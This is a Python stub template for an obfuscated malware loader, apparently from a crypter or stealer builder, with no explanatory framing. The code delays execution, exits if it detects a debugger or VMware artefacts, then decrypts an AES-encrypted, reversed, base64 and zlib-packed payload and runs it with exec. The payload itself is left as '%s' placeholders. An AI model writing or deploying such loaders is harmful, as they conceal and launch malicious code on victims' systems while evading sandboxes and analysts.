import base64
import zlib
import time
import sys
import os
import json
import sqlite3
import ctypes
import ctypes.wintypes
import subprocess
import shutil
import random
import re
import traceback
import logging
import threading
import urllib3
import pyaes

time.sleep(90)
if sys.gettrace() is not None:
    sys.exit()
if os.path.exists("C:\\Program Files\\VMware\\VMware Tools") or os.path.exists("C:\\Windows\\System32\\drivers\\vmmouse.sys"):
    sys.exit()

enc = base64.b64decode("%s")[::-1]
key = base64.b64decode("%s")
iv = base64.b64decode("%s")

aes = pyaes.AESModeOfOperationCBC(key, iv)
decrypted = b""
for i in range(0, len(enc), 16):
    decrypted += aes.decrypt(enc[i:i+16])

pad = decrypted[-1]
decrypted = decrypted[:-pad]

source = zlib.decompress(decrypted).decode("utf-8")
exec(compile(source, "<string>", "exec"))